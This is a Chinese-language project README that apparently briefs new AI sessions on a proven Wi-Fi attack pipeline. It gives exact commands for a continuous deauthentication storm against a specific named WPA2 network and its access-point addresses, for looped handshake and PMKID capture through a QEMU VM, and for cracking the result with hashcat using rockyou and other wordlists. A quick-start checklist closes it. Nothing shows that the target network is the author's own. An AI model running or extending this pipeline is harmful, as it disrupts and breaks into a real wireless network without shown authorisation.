# KNOWN GOOD VERSION — 新對話先讀這個

> 本 repo 累積了很多實驗與「優化」的痕跡（`PROGRESS.md` 很長、很多檔是一次性腳本）。
> **以這個檔為準**：下面這套 = 已實測「能抓包 + 能破解」的乾淨版本。
> 2026-09-15 那串 cracker/capture 優化（`2fe6558`..`b6bd50f`）**走偏了**，別再疊上去。

---

## 1. 架構（分工，別搞反）

| 機器 | 角色 | 裝置 |
|---|---|---|
| **Mac**（Apple M2 Air, IP `192.168.1.123`） | **抓包** | **內建 en0 = 網路/SSH（待在家、不動）**；**USB 網卡 DWA-160 = 抓包** |
| **Windows**（RTX 4090, `192.168.1.107`） | **破解** | `windows_cracker_app.py`（port **8766**）／ `wifi_crack_gui.py` |
| **手機**（Xiaomi 11T, root, adb `24d165c4`） | 輔助（本版本不需要） | — |

- **目標**：`32H10F`（2.4G WPA2-Personal；AP `bc:3e:07:01:dc:98`／`…dc:92`，ch1 / 2412 MHz）。
- **DWA-160** = Ralink **RT5592**，USB id `148f:5572`（`ioreg` 看得見；macOS 有 RtWlanU kext，但**抓包不走 macOS 驅動**——USB passthrough 進 VM，由 VM 內 `rt2800usb` 驅動）。
- **內建 en0 全程供網路/SSH，不参与抓包，也不禁掉**。（之前 `mac-capture/disable_builtin_wifi.sh` 是基於「禁內建改走 USB」的舊假設，非本版本用路。）

---

## 2. 能打的版本 = base commit `628830b`（2026-09-14）

| 檔案 | 本版本狀態 |
|---|---|
| `mac_capture_app.py` | `628830b` 抓包 recipe + 即時 USB 狀態/「抓到 N / 沒抓到」顯示（後加的便利顯示，保留） |
| `windows_cracker_app.py` | `628830b` 簡單版：`-a 0`／`-a 3`；`/api/receive-hash` → `wifi_wordlist`（1.4M）直跑 |
| `wifi_crack_gui.py` | `628830b` 5 階段梯子 + **已移除 GPU 電控**（功率外部管理），保留 GPU 即時資訊顯示 |

---

## 3. Mac 抓包（QEMU VM 模型）

`mac_capture_app.py`：雙擊 → 起 QEMU（Alpine VM，DWA-160 USB passthrough）→ SSH 進 VM 跑：

```sh
iw dev wlan0 set type monitor      # monitor；全幀抓，別加 "wlan type mgt" 過濾（EAPOL 是 DATA 幀 0x888E）
ifconfig wlan0 up
nohup aireplay-ng --deauth 9999 --ignore-negative-one -a <BSSID> -c <CLIENT> wlan0 &   # 持續 deauth 風暴
for i in $(seq 1 $N); do timeout 10 airodump-ng -w /tmp/capapp -c <CH> wlan0; done      # 多次累積抓包
ls /tmp/capapp-*.cap | xargs hcxpcapngtool -o /tmp/capapp.22000                          # → .22000
```
→ 把 `.22000` POST 到 Windows `:8766/api/receive-hash {hash, ssid, bssid}`。

VM 需具備：`rt2800usb` 驅動 + **`rt2870.bin` 韌體**（RT5592 用；缺則 wlan0 半初始化、進不了 monitor）+ aircrack-ng + hcxpcapngtool。
QEMU 關鍵參（USB 給 VM）：`-device qemu-xhci,id=xhci -device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572`。

> 註：真實 client 多走 **PMKSA 快重連**（跳過完整 4-way）→ 短窗常 0 EAPOL；靠「更長 capture + 持續 deauth」累積命中，或抓到的 PMKID 亦可 crack（同 keyspace）。

---

## 4. Windows 破解（簡單版，別加花樣）

`windows_cracker_app.py`（port 8766）收到 `.22000` → 開跑：

```
hashcat -m 22000 --self-test-disable --restore-disable -a 0 <hashfile> <wordlist>
```
- 詞表在 `C:\wifi-crack\wordlists\`：`rockyou.txt`（14M）、`wifi_wordlist_combined.txt`（1.4M）。
- **只用 `-a 0`（straight）或 `-a 3`（hybrid mask）**。
- 破解中 → potfile 有記錄 / `cracked=true` + `password=<pw>`。

---

## 5. ❌ 走偏、別用的優化（2026-09-15，commit `2fe6558`→`b6bd50f`）

- **cracker**：多階段重排（fast→slow 140B-4-digit 放最後）、`-a 6` true-hybrid、`--backend-devices-keepfree=98`、`-w 3`、`cracked.txt`（wpa-sec）詞庫階段。
- **capture**：`hcxdumptool --active_scan` PMKID 階段。

這些是「優化」疊上去的，讓管線變複雜卻沒更好。回到上面的 airodump+deauth 簡單版 + `-a 0`/`-a 3` 就夠。

---

## 6. 「能抓能破解」的歷史證據

- `12e340f`（09-13）：DWA-160 VM **抓到新 EAPOL `90b8d132`**；`hs.22000` = 2 PMKID + EAPOL。
- `628830b`（09-14）：抓包卡死根因修好 + airodump 迴圈完整跑通（本版本 base）。
- `3403a68`（09-15）：明確把 capture **revert 回「proven 628830b」**。

---

## 7. 快速起動（新對話照做）

1. Windows：`python windows_cracker_app.py`（port 8766 起來）。
2. Mac：確認 DWA-160 插在 USB、內建 en0 有 IP；雙擊 `mac_capture_app.py`（或 `MacCapture.app`），選 SSID/BSSID/ch/client/duration → 跑抓包 → 自動 POST hash。
3. 回 Windows 看 cracker 有沒有中 potfile。
4. 卡住先看 `PROGRESS.md` 對應日期段落；**改管線前先對照本檔，別又疊新優化**。